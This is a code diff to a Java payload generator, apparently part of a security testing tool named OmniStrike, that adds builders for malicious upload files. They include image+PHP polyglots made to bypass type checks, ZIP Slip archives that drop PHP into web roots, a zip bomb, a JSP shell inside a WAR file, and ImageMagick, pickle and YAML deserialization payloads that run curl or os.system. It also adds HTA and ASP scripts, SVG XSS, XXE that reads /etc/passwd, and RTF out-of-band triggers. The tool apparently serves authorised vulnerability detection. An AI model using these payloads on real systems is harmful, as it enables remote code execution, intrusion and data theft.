@@ -680,9 +680,11 @@ public class FilePayloadGenerator {
         StringBuilder smarty = new StringBuilder();
         smarty.append("{* OmniStrike POC *}\n");
         smarty.append("{$smarty.version}\n");
-        smarty.append("{php}echo '").append(canary).append("';{/php}\n");
+        smarty.append("{system('echo ").append(canary).append("')}\n"); // Smarty 3+
+        smarty.append("{php}echo '").append(canary).append("';{/php}\n"); // Smarty 2.x fallback
         if (oobUrl != null && !oobUrl.isEmpty()) {
-            smarty.append("{php}file_get_contents('").append(oobUrl).append("');{/php}\n");
+            smarty.append("{system('curl ").append(oobUrl).append("')}\n");
+            smarty.append("{php}file_get_contents('").append(oobUrl).append("');{/php}\n"); // Smarty 2.x fallback
         }
         return smarty.toString().getBytes(StandardCharsets.UTF_8);
     }
@@ -829,6 +831,341 @@ public class FilePayloadGenerator {
         return md.toString().getBytes(StandardCharsets.UTF_8);
     }
 
+    // ==================== GIF + PHP Polyglot ====================
+
+    public static byte[] gifPhpPolyglot(String canary, String oobUrl) {
+        StringBuilder payload = new StringBuilder();
+        payload.append("GIF89a"); // GIF magic bytes — passes getimagesize() and file/mime checks
+        payload.append("<?php\n");
+        payload.append("// OmniStrike POC — GIF+PHP polyglot\n");
+        payload.append("echo '").append(canary).append("';\n");
+        if (oobUrl != null && !oobUrl.isEmpty()) {
+            payload.append("@file_get_contents('").append(oobUrl).append("');\n");
+        }
+        payload.append("echo phpversion();\n");
+        payload.append("?>\n");
+        return payload.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    }
+
+    // ==================== JPEG + PHP Polyglot ====================
+
+    public static byte[] jpegPhpPolyglot(String canary, String oobUrl) {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        try {
+            // JPEG SOI + APP0 JFIF header (passes getimagesize)
+            baos.write(new byte[]{(byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0});
+            byte[] jfif = {0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
+                    0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00};
+            baos.write(jfif);
+            // COM marker with PHP payload
+            StringBuilder php = new StringBuilder();
+            php.append("<?php echo '").append(canary).append("';");
+            if (oobUrl != null && !oobUrl.isEmpty()) {
+                php.append("@file_get_contents('").append(oobUrl).append("');");
+            }
+            php.append("echo phpversion();?>");
+            byte[] phpBytes = php.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
+            baos.write(new byte[]{(byte) 0xFF, (byte) 0xFE}); // COM marker
+            int commentLen = phpBytes.length + 2;
+            baos.write((byte) (commentLen >> 8));
+            baos.write((byte) (commentLen & 0xFF));
+            baos.write(phpBytes);
+            // Minimal image data + EOI
+            baos.write(new byte[]{
+                    (byte) 0xFF, (byte) 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00,
+                    0x01, 0x01, 0x01, 0x11, 0x00,
+                    (byte) 0xFF, (byte) 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01, 0x05,
+                    0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02,
+                    0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
+                    (byte) 0xFF, (byte) 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
+                    0x3F, 0x00, 0x7B, 0x40,
+                    (byte) 0xFF, (byte) 0xD9
+            });
+        } catch (Exception e) {
+            return new byte[0];
+        }
+        return baos.toByteArray();
+    }
+
+    // ==================== ZIP Slip (Path Traversal via Archive) ====================
+
+    public static byte[] zipSlip(String canary, String oobUrl) {
+        try {
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ZipOutputStream zos = new ZipOutputStream(baos);
+            // Entry with path traversal — extracts outside the intended directory
+            String phpPayload = "<?php echo '" + canary + "';"
+                    + (oobUrl != null && !oobUrl.isEmpty() ? "@file_get_contents('" + oobUrl + "');" : "")
+                    + "echo phpversion();?>";
+            // Multiple traversal depths for different extraction contexts
+            String[] paths = {
+                    "../../../tmp/" + canary + ".txt",
+                    "../../../../tmp/" + canary + ".php",
+                    "../../../var/www/html/" + canary + ".php",
+            };
+            for (String path : paths) {
+                zos.putNextEntry(new ZipEntry(path));
+                zos.write(phpPayload.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+                zos.closeEntry();
+            }
+            // Also include a benign file so the ZIP looks normal
+            zos.putNextEntry(new ZipEntry("readme.txt"));
+            zos.write(("OmniStrike POC — " + canary).getBytes(java.nio.charset.StandardCharsets.UTF_8));
+            zos.closeEntry();
+            zos.close();
+            return baos.toByteArray();
+        } catch (Exception e) {
+            return new byte[0];
+        }
+    }
+
+    // ==================== ZIP Bomb (DoS via Decompression) ====================
+
+    public static byte[] zipBomb(String canary) {
+        try {
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ZipOutputStream zos = new ZipOutputStream(baos);
+            // Create a file filled with zeros — compresses extremely well
+            // 10MB of zeros compresses to ~10KB
+            byte[] zeros = new byte[1024 * 1024]; // 1MB of zeros
+            for (int i = 0; i < 10; i++) {
+                zos.putNextEntry(new ZipEntry(canary + "_" + i + ".txt"));
+                zos.write(zeros);
+                zos.closeEntry();
+            }
+            zos.close();
+            return baos.toByteArray();
+        } catch (Exception e) {
+            return new byte[0];
+        }
+    }
+
+    // ==================== WAR Deploy (Tomcat/JBoss) ====================
+
+    public static byte[] warDeploy(String canary, String oobUrl) {
+        try {
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ZipOutputStream zos = new ZipOutputStream(baos);
+            // WEB-INF/web.xml (minimal)
+            String webXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" version=\"3.1\">\n"
+                    + "  <display-name>" + canary + "</display-name>\n"
+                    + "</web-app>\n";
+            zos.putNextEntry(new ZipEntry("WEB-INF/web.xml"));
+            zos.write(webXml.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+            zos.closeEntry();
+            // index.jsp — POC shell
+            StringBuilder jsp = new StringBuilder();
+            jsp.append("<%@ page import=\"java.net.*,java.io.*\" %>\n");
+            jsp.append("<%\n");
+            jsp.append("out.println(\"").append(canary).append("\");\n");
+            if (oobUrl != null && !oobUrl.isEmpty()) {
+                jsp.append("try { new URL(\"").append(oobUrl).append("\").openStream().close(); } catch(Exception e) {}\n");
+            }
+            jsp.append("out.println(System.getProperty(\"java.version\"));\n");
+            jsp.append("out.println(System.getProperty(\"os.name\"));\n");
+            jsp.append("%>\n");
+            zos.putNextEntry(new ZipEntry("index.jsp"));
+            zos.write(jsp.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8));
+            zos.closeEntry();
+            zos.close();
+            return baos.toByteArray();
+        } catch (Exception e) {
+            return new byte[0];
+        }
+    }
+
+    // ==================== ImageMagick MVG Exploit ====================
+
+    public static byte[] imageMagickMvg(String canary, String oobUrl) {
+        String url = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl : "https://COLLABORATOR";
+        StringBuilder mvg = new StringBuilder();
+        mvg.append("push graphic-context\n");
+        mvg.append("viewbox 0 0 640 480\n");
+        mvg.append("fill 'url(").append(url).append("/").append(canary).append(")'\n");
+        mvg.append("pop graphic-context\n");
+        return mvg.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    }
+
+    // ==================== ImageMagick SVG Delegate RCE ====================
+
+    public static byte[] imageMagickSvg(String canary, String oobUrl) {
+        String cmd = (oobUrl != null && !oobUrl.isEmpty())
+                ? "curl " + oobUrl + "/" + canary
+                : "id > /tmp/" + canary + ".txt";
+        StringBuilder svg = new StringBuilder();
+        svg.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
+        svg.append("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n");
+        svg.append("  <image xlink:href=\"ephemeral:/").append(cmd).append("\" />\n");
+        svg.append("  <!-- ").append(canary).append(" -->\n");
+        svg.append("  <image xlink:href=\"https://example.com/image.png|").append(cmd).append("\" />\n");
+        svg.append("</svg>\n");
+        return svg.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    }
+
+    // ==================== Python Pickle RCE ====================
+
+    public static byte[] pythonPickle(String canary, String oobUrl) {
+        // Generate a Python script that creates the pickle file
+        // The actual pickle payload uses __reduce__ to call os.system()
+        String cmd = (oobUrl != null && !oobUrl.isEmpty())
+                ? "curl " + oobUrl + "/" + canary
+                : "echo " + canary;
+        // Pickle opcodes for: os.system("<cmd>")
+        // cos\nsystem\n(S'<cmd>'\ntR.
+        StringBuilder pickle = new StringBuilder();
+        pickle.append("cos\nsystem\n(S'").append(cmd).append("'\ntR.");
+        return pickle.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    }
+
+    // ==================== HTA (HTML Application) ====================
+
+    public static byte[] htaFile(String canary, String oobUrl) {
+        StringBuilder hta = new StringBuilder();
+        hta.append("<html>\n<head>\n<title>").append(canary).append("</title>\n");
+        hta.append("<HTA:APPLICATION ID=\"omnistrike\" APPLICATIONNAME=\"").append(canary).append("\" ");
+        hta.append("SINGLEINSTANCE=\"yes\" WINDOWSTATE=\"minimize\">\n");
+        hta.append("</head>\n<body>\n<script language=\"VBScript\">\n");
+        if (oobUrl != null && !oobUrl.isEmpty()) {
+            hta.append("Set objHTTP = CreateObject(\"MSXML2.ServerXMLHTTP\")\n");
+            hta.append("objHTTP.open \"GET\", \"").append(oobUrl).append("/").append(canary).append("\", False\n");
+            hta.append("objHTTP.send\n");
+        }
+        hta.append("Set objShell = CreateObject(\"WScript.Shell\")\n");
+        hta.append("objShell.Run \"cmd /c echo ").append(canary).append(" > %TEMP%\\").append(canary).append(".txt\", 0\n");
+        hta.append("</script>\n</body>\n</html>\n");
+        return hta.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    }
+
+    // ==================== ASP Classic Shell (POC) ====================
+
+    public static byte[] aspClassicPoc(String canary, String oobUrl) {
+        StringBuilder asp = new StringBuilder();
+        asp.append("<%\n");
+        asp.append("' OmniStrike POC — confirms ASP Classic execution\n");
+        asp.append("Response.Write \"").append(canary).append("\"\n");
+        if (oobUrl != null && !oobUrl.isEmpty()) {
+            asp.append("Set http = CreateObject(\"MSXML2.ServerXMLHTTP\")\n");
+            asp.append("http.open \"GET\", \"").append(oobUrl).append("/").append(canary).append("\", False\n");
+            asp.append("http.send\n");
+            asp.append("Set http = Nothing\n");
+        }
+        asp.append("Response.Write Server.MapPath(\".\")\n");
+        asp.append("%>\n");
+        return asp.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    }
+
+    // ==================== SVG with foreignObject ====================
+
+    public static byte[] svgForeignObject(String canary, String oobUrl) {
+        StringBuilder svg = new StringBuilder();
+        svg.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
+        svg.append("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n");
+        svg.append("  <foreignObject width=\"100%\" height=\"100%\">\n");
+        svg.append("    <body xmlns=\"http://www.w3.org/1999/xhtml\">\n");
+        if (oobUrl != null && !oobUrl.isEmpty()) {
+            svg.append("      <iframe src=\"").append(oobUrl).append("/").append(canary).append("\"></iframe>\n");
+            svg.append("      <img src=\"").append(oobUrl).append("/").append(canary).append("\">\n");
+        }
+        svg.append("      <script>document.title='").append(canary).append("'</script>\n");
+        svg.append("    </body>\n");
+        svg.append("  </foreignObject>\n");
+        svg.append("</svg>\n");
+        return svg.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    }
+
+    // ==================== PPTX with XXE ====================
+
+    public static byte[] pptxWithXxe(String canary, String oobUrl) {
+        String entityUrl = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl : "file:///etc/passwd";
+        try {
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ZipOutputStream zos = new ZipOutputStream(baos);
+            // [Content_Types].xml with XXE
+            String contentTypes = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<!DOCTYPE Types [\n"
+                    + "  <!ENTITY xxe SYSTEM \"" + entityUrl + "\">\n"
+                    + "]>\n"
+                    + "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n"
+                    + "  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\n"
+                    + "  <Default Extension=\"xml\" ContentType=\"application/xml\"/>\n"
+                    + "  <!-- " + canary + " &xxe; -->\n"
+                    + "</Types>\n";
+            zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
+            zos.write(contentTypes.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+            zos.closeEntry();
+            // _rels/.rels
+            String rels = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n"
+                    + "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"ppt/presentation.xml\"/>\n"
+                    + "</Relationships>\n";
+            zos.putNextEntry(new ZipEntry("_rels/.rels"));
+            zos.write(rels.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+            zos.closeEntry();
+            // ppt/presentation.xml
+            String pres = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<p:presentation xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\">\n"
+                    + "  <p:sldMasterIdLst/>\n"
+                    + "  <p:sldIdLst/>\n"
+                    + "  <!-- " + canary + " -->\n"
+                    + "</p:presentation>\n";
+            zos.putNextEntry(new ZipEntry("ppt/presentation.xml"));
+            zos.write(pres.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+            zos.closeEntry();
+            zos.close();
+            return baos.toByteArray();
+        } catch (Exception e) {
+            return new byte[0];
+        }
+    }
+
+    // ==================== YAML Deserialization ====================
+
+    public static byte[] yamlDeserialize(String canary, String oobUrl) {
+        String cmd = (oobUrl != null && !oobUrl.isEmpty())
+                ? "curl " + oobUrl + "/" + canary
+                : "echo " + canary;
+        StringBuilder yaml = new StringBuilder();
+        yaml.append("# OmniStrike POC — YAML deserialization\n");
+        yaml.append("# Python (PyYAML unsafe_load)\n");
+        yaml.append("!!python/object/apply:os.system ['").append(cmd).append("']\n");
+        yaml.append("---\n");
+        yaml.append("# Ruby (Psych/YAML.load)\n");
+        yaml.append("--- !ruby/object:Gem::Installer\ni: x\n");
+        yaml.append("---\n");
+        yaml.append("# Java (SnakeYAML)\n");
+        yaml.append("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"");
+        yaml.append(oobUrl != null && !oobUrl.isEmpty() ? oobUrl : "http://COLLABORATOR");
+        yaml.append("/").append(canary).append("\"]]]]\n");
+        return yaml.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    }
+
+    // ==================== RTF with OLE Object ====================
+
+    public static byte[] rtfOle(String canary, String oobUrl) {
+        String url = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl + "/" + canary : "http://COLLABORATOR/" + canary;
+        StringBuilder rtf = new StringBuilder();
+        rtf.append("{\\rtf1\\ansi\\deff0\n");
+        rtf.append("{\\info{\\title ").append(canary).append("}}\n");
+        rtf.append("OmniStrike POC\\par\n");
+        // OLE link — triggers HTTP request when opened in Word
+        rtf.append("{\\object\\objautlink\\objupdate\n");
+        rtf.append("{\\*\\objclass htmlfile}\n");
+        rtf.append("{\\*\\objdata ");
+        // Encode the URL as hex for RTF objdata (simplified — link reference)
+        byte[] urlBytes = url.getBytes(java.nio.charset.StandardCharsets.US_ASCII);
+        for (byte b : urlBytes) {
+            rtf.append(String.format("%02x", b));
+        }
+        rtf.append("}\n");
+        rtf.append("{\\result{\\pict}}}\n");
+        // Also embed via field code — more reliable OOB trigger
+        rtf.append("{\\field{\\*\\fldinst INCLUDEPICTURE \"").append(url).append("\" \\\\d}{\\fldrslt}}\n");
+        rtf.append("}\n");
+        return rtf.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    }
+
     // ==================== Summary / List ====================
 
     /**
@@ -875,6 +1212,20 @@ public class FilePayloadGenerator {
                 {"csv_injection", "CSV with formula injection", ".csv", "text/csv"},
                 {"latex_injection", "LaTeX with RCE (write18)", ".tex", "text/plain"},
                 {"markdown_xss", "Markdown with HTML/XSS injection", ".md", "text/markdown"},
+                {"gif_php_polyglot", "GIF+PHP Polyglot (bypasses getimagesize)", ".gif.php", "image/gif"},
+                {"jpeg_php_polyglot", "JPEG+PHP Polyglot (bypasses getimagesize)", ".jpg.php", "image/jpeg"},
+                {"zip_slip", "ZIP Slip (path traversal via archive)", ".zip", "application/zip"},
+                {"zip_bomb", "ZIP Bomb (decompression DoS)", ".zip", "application/zip"},
+                {"war_deploy", "WAR Deploy (Tomcat/JBoss JSP shell)", ".war", "application/java-archive"},
+                {"imagemagick_mvg", "ImageMagick MVG Exploit", ".mvg", "image/x-mvg"},
+                {"imagemagick_svg", "ImageMagick SVG Delegate RCE", ".svg", "image/svg+xml"},
+                {"python_pickle", "Python Pickle RCE (deserialization)", ".pkl", "application/octet-stream"},
+                {"hta_file", "HTA Windows Application", ".hta", "application/hta"},
+                {"asp_classic", "ASP Classic POC (echo canary + OOB)", ".asp", "text/plain"},
+                {"svg_foreign_object", "SVG with foreignObject XSS", ".svg", "image/svg+xml"},
+                {"pptx_xxe", "PPTX with XXE", ".pptx", "application/vnd.openxmlformats-officedocument.presentationml.presentation"},
+                {"yaml_deserialize", "YAML Deserialization (Python/Ruby/Java)", ".yml", "text/yaml"},
+                {"rtf_ole", "RTF with OLE Object (OOB trigger)", ".rtf", "application/rtf"},
         };
     }
 
@@ -926,6 +1277,20 @@ public class FilePayloadGenerator {
             case "csv_injection": return csvInjection(canary, oobUrl);
             case "latex_injection": return latexPoc(canary, oobUrl);
             case "markdown_xss": return markdownXss(canary, oobUrl);
+            case "gif_php_polyglot": return gifPhpPolyglot(canary, oobUrl);
+            case "jpeg_php_polyglot": return jpegPhpPolyglot(canary, oobUrl);
+            case "zip_slip": return zipSlip(canary, oobUrl);
+            case "zip_bomb": return zipBomb(canary);
+            case "war_deploy": return warDeploy(canary, oobUrl);
+            case "imagemagick_mvg": return imageMagickMvg(canary, oobUrl);
+            case "imagemagick_svg": return imageMagickSvg(canary, oobUrl);
+            case "python_pickle": return pythonPickle(canary, oobUrl);
+            case "hta_file": return htaFile(canary, oobUrl);
+            case "asp_classic": return aspClassicPoc(canary, oobUrl);
+            case "svg_foreign_object": return svgForeignObject(canary, oobUrl);
+            case "pptx_xxe": return pptxWithXxe(canary, oobUrl);
+            case "yaml_deserialize": return yamlDeserialize(canary, oobUrl);
+            case "rtf_ole": return rtfOle(canary, oobUrl);
             default: return new byte[0];
         }
     }
